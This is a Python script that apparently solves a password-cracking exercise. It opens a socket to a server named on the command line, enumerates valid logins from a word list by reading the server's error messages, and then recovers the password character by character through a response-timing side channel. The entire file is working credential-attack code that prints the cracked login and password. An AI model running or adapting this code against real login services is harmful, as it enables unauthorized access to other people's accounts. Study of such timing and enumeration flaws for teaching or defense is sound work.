import sys
import socket
import json
import string
from datetime import timedelta, datetime
from itertools import cycle


class Hacker:
    _instance = None

    def __new__(cls, *args, **kwargs):
        if not Hacker._instance:
            Hacker._instance = super(Hacker, cls).__new__(cls, *args, **kwargs)
        return Hacker._instance

    def __init__(self):
        self.client_socket = None
        self.ip = None
        self.port = None
        self.login_password = {"login": "gyu", "password": " "}

    @staticmethod
    def get_login():
        with open("logins.txt", "r", encoding="utf-8") as f:
            all_logins = f.read()
            return all_logins.split("\n")

    @staticmethod
    def get_json_format(dictionary):
        json_message = json.dumps(dictionary)
        return json_message

    def socket_connection(self, socket_opened):
        args = sys.argv
        self.ip, self.port = str(args[1]), int(args[2])
        address = (self.ip, self.port)
        socket_opened.connect(address)

    def send_receive_login(self, message_dict, socket_opened):
        send_message = self.get_json_format(message_dict).encode()
        socket_opened.send(send_message)
        response = socket_opened.recv(1024)
        receive_message = response.decode("utf-8")
        return json.loads(receive_message)

    def send_receive_password(self, message_dict, socket_opened):
        send_message = self.get_json_format(message_dict).encode()
        start = datetime.now()
        socket_opened.send(send_message)
        response = socket_opened.recv(1024)
        receive_message = response.decode("utf-8")
        finish = datetime.now()
        time_difference = (finish - start)
        d = timedelta(milliseconds=100)
        server_response = json.loads(receive_message)
        if server_response["result"] == "Connection success!" or time_difference >= d:
            return server_response

    def main(self):
        all_characters = (string.ascii_letters + string.digits)
        with socket.socket() as client_socket:
            self.socket_connection(client_socket)
            for login in self.get_login():
                self.login_password["login"] = login
                message = self.send_receive_login(self.login_password, client_socket)
                if message["result"] == "Wrong password!":
                    self.login_password["password"] = ''
                    break
            for character in cycle(all_characters):
                l_p_to_try = dict(self.login_password)
                l_p_to_try["password"] += character
                message = self.send_receive_password(l_p_to_try, client_socket)
                if message:
                    if message["result"] == "Wrong password!":
                        self.login_password = dict(l_p_to_try)
                    elif message["result"] == "Connection success!":
                        self.login_password = dict(l_p_to_try)
                        break
            print(self.get_json_format(self.login_password))


hack = Hacker()
hack.main()
